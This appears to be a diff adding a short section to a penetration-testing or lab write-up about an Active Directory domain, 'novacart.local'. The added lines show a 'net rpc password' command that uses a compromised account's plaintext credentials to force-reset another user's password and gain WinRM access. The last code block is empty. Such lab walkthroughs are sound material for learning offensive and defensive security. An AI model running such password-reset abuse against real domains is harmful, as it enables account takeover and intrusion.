@@ -736,3 +736,17 @@ I have ForceChangePassword on 6 users
 
 The user `l.thompson` is the most interesting, he is part of the remote management users group
 
+
+# Compromising `l.thompson`
+
+```python
+net rpc password "l.thompson" 'Password123!' -U "novacart.local"/"j.dillon"%'novafire2008' -S "10.0.18.23"
+```
+Now im part of the group i can change the users password
+
+Now i can winrm in FINALLY!
+
+
+```python
+
+```
